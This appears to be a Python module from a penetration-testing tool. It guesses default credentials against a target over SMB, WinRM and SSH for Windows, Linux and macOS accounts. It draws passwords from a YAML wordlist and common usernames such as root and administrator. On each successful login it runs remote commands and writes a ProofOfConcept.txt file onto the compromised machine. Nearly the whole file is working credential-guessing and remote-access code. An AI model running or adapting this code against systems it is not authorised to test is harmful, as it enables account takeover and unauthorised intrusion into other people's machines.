import subprocess
import tempfile
import platform
import yaml
import os

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    import winrm
except ImportError:
    winrm = None

try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    SMBConnection = None

def load_credential_wordlist():
    """Load and dynamically update credential wordlist"""
    try:
        yaml_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'default_passwords.yaml')
        with open(yaml_path, 'r', encoding='utf-8') as f:
            password_data = yaml.safe_load(f)
        
        return password_data
    except Exception as e:
        return {"error": f"Could not load wordlist: {e}"}

def add_to_wordlist(category, new_passwords):
    """Dynamically add passwords to wordlist"""
    try:
        yaml_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'default_passwords.yaml')
        
        with open(yaml_path, 'r', encoding='utf-8') as f:
            password_data = yaml.safe_load(f)
        
        if category not in password_data:
            password_data[category] = []
        
        # Add new passwords if they don't exist
        for pwd in new_passwords:
            if pwd not in password_data[category]:
                password_data[category].append(pwd)
        
        with open(yaml_path, 'w', encoding='utf-8') as f:
            yaml.safe_dump(password_data, f, default_flow_style=False, sort_keys=False)
        
        return True
    except Exception as e:
        return False

def test_domain_credentials(target, domain=None):
    """Test domain credentials and create proof of concept file"""
    results = []
    password_data = load_credential_wordlist()
    
    # Get domain-specific and Windows passwords
    domain_passwords = password_data.get('domain', []) + password_data.get('windows', []) + password_data.get('common', [])
    domain_users = ['administrator', 'admin', 'user', 'guest', 'test', 'support', 'service']
    
    # Test SMB/Windows domain authentication
    if SMBConnection:
        for user in domain_users:
            for pwd in domain_passwords[:15]:  # Limit to prevent lockout
                try:
                    # Try domain authentication
                    domain_user = f"{domain}\\{user}" if domain else user
                    conn = SMBConnection(user, pwd, "pentest", "target", domain=domain, use_ntlm_v2=True)
                    connected = conn.connect(target, 445, timeout=5)
                    
                    if connected:
                        # Create proof of concept file
                        poc_result = create_proof_of_concept_smb(conn, user, "windows")
                        
                        results.append({
                            "protocol": "SMB/Domain",
                            "user": domain_user,
                            "password": pwd,
                            "status": "success",
                            "proof_of_concept": poc_result,
                            "details": f"Domain authentication successful for {domain_user}"
                        })
                        
                        conn.close()
                        break
                except Exception as e:
                    continue
    
    # Test WinRM/PowerShell remoting
    if winrm:
        for user in domain_users:
            for pwd in domain_passwords[:10]:
                try:
                    domain_user = f"{domain}\\{user}" if domain else user
                    session = winrm.Session(f'http://{target}:5985/wsman', auth=(domain_user, pwd))
                    
                    # Test connection and create proof of concept
                    result = session.run_cmd('whoami')
                    if result.status_code == 0:
                        poc_result = create_proof_of_concept_winrm(session, user, "windows")
                        
                        results.append({
                            "protocol": "WinRM",
                            "user": domain_user,
                            "password": pwd,
                            "status": "success",
                            "proof_of_concept": poc_result,
                            "details": f"WinRM authentication successful: {result.std_out.decode()}"
                        })
                        break
                except Exception as e:
                    continue
    
    return {
        "domain_credential_tests": results,
        "summary": f"Domain credential testing completed for {target}. Found {len([r for r in results if r['status'] == 'success'])} valid credentials."
    }

def test_linux_credentials(target):
    """Test Linux system credentials and create proof of concept"""
    results = []
    password_data = load_credential_wordlist()
    
    # Get Linux-specific passwords
    linux_passwords = password_data.get('linux', []) + password_data.get('linux_service', []) + password_data.get('common', [])
    linux_users = ['root', 'admin', 'user', 'ubuntu', 'centos', 'debian', 'pi', 'kali']
    
    if paramiko:
        for user in linux_users:
            for pwd in linux_passwords[:15]:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, username=user, password=pwd, timeout=5)
                    
                    # Create proof of concept file
                    poc_result = create_proof_of_concept_ssh(ssh, user, "linux")
                    
                    results.append({
                        "protocol": "SSH",
                        "user": user,
                        "password": pwd,
                        "status": "success",
                        "proof_of_concept": poc_result,
                        "details": f"SSH authentication successful for {user}"
                    })
                    
                    ssh.close()
                    break
                except Exception as e:
                    continue
    
    return {
        "linux_credential_tests": results,
        "summary": f"Linux credential testing completed for {target}. Found {len([r for r in results if r['status'] == 'success'])} valid credentials."
    }

def test_macos_credentials(target):
    """Test macOS system credentials and create proof of concept"""
    results = []
    password_data = load_credential_wordlist()
    
    # Get macOS-specific passwords
    macos_passwords = password_data.get('macos', []) + password_data.get('common', [])
    macos_users = ['admin', 'administrator', 'user', 'guest', 'root']
    
    if paramiko:
        for user in macos_users:
            for pwd in macos_passwords[:15]:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target, username=user, password=pwd, timeout=5)
                    
                    # Create proof of concept file
                    poc_result = create_proof_of_concept_ssh(ssh, user, "macos")
                    
                    results.append({
                        "protocol": "SSH",
                        "user": user,
                        "password": pwd,
                        "status": "success",
                        "proof_of_concept": poc_result,
                        "details": f"macOS SSH authentication successful for {user}"
                    })
                    
                    ssh.close()
                    break
                except Exception as e:
                    continue
    
    return {
        "macos_credential_tests": results,
        "summary": f"macOS credential testing completed for {target}. Found {len([r for r in results if r['status'] == 'success'])} valid credentials."
    }

def create_proof_of_concept_ssh(ssh_client, username, os_type):
    """Create proof of concept file via SSH (Linux/macOS)"""
    try:
        # Determine home directory
        stdin, stdout, stderr = ssh_client.exec_command("echo $HOME")
        home_dir = stdout.read().decode().strip()
        
        # Create proof of concept file
        poc_file = f"{home_dir}/ProofOfConcept.txt"
        poc_content = f"Proof of Concept - Access gained via {username} on {os_type} system"
        
        # Use touch equivalent and add content
        stdin, stdout, stderr = ssh_client.exec_command(f'echo "{poc_content}" > {poc_file}')
        
        # Verify file creation
        stdin, stdout, stderr = ssh_client.exec_command(f'ls -la {poc_file}')
        verification = stdout.read().decode().strip()
        
        return {
            "status": "created",
            "file_path": poc_file,
            "content": poc_content,
            "verification": verification
        }
    except Exception as e:
        return {
            "status": "failed",
            "error": str(e)
        }

def create_proof_of_concept_smb(smb_connection, username, os_type):
    """Create proof of concept file via SMB (Windows)"""
    try:
        # Try to access C$ share and create file
        poc_content = f"Proof of Concept - Access gained via {username} on {os_type} system"
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_file.write(poc_content)
            temp_path = temp_file.name
        
        # Upload to Windows system
        with open(temp_path, 'rb') as f:
            smb_connection.storeFile('C$', 'Users\\Public\\ProofOfConcept.txt', f)
        
        # Clean up temp file
        os.unlink(temp_path)
        
        return {
            "status": "created",
            "file_path": "C:\\Users\\Public\\ProofOfConcept.txt",
            "content": poc_content,
            "method": "SMB upload"
        }
    except Exception as e:
        return {
            "status": "failed",
            "error": str(e)
        }

def create_proof_of_concept_winrm(winrm_session, username, os_type):
    """Create proof of concept file via WinRM (Windows)"""
    try:
        # Get user profile path
        result = winrm_session.run_cmd('echo %USERPROFILE%')
        user_profile = result.std_out.decode().strip()
        
        # Create proof of concept file
        poc_content = f"Proof of Concept - Access gained via {username} on {os_type} system"
        poc_file = f"{user_profile}\\ProofOfConcept.txt"
        
        # Create file using echo
        create_cmd = f'echo {poc_content} > "{poc_file}"'
        result = winrm_session.run_cmd(create_cmd)
        
        # Verify file creation
        verify_result = winrm_session.run_cmd(f'dir "{poc_file}"')
        verification = verify_result.std_out.decode().strip()
        
        return {
            "status": "created",
            "file_path": poc_file,
            "content": poc_content,
            "verification": verification
        }
    except Exception as e:
        return {
            "status": "failed",
            "error": str(e)
        }

def run_comprehensive_credential_test(target, domain=None, os_hint=None):
    """Run comprehensive credential testing across all platforms"""
    results = {
        "target": target,
        "domain": domain,
        "os_hint": os_hint,
        "tests_performed": []
    }
    
    # Test based on OS hint or try all
    if os_hint == "windows" or not os_hint:
        domain_results = test_domain_credentials(target, domain)
        results["tests_performed"].append(domain_results)
    
    if os_hint == "linux" or not os_hint:
        linux_results = test_linux_credentials(target)
        results["tests_performed"].append(linux_results)
    
    if os_hint == "macos" or not os_hint:
        macos_results = test_macos_credentials(target)
        results["tests_performed"].append(macos_results)
    
    # Count successful authentications
    successful_auths = 0
    for test_result in results["tests_performed"]:
        for test_type, test_data in test_result.items():
            if isinstance(test_data, list):
                successful_auths += len([r for r in test_data if r.get('status') == 'success'])
    
    results["summary"] = f"Comprehensive credential testing completed. {successful_auths} successful authentications with proof of concept files created."
    
    return results
    
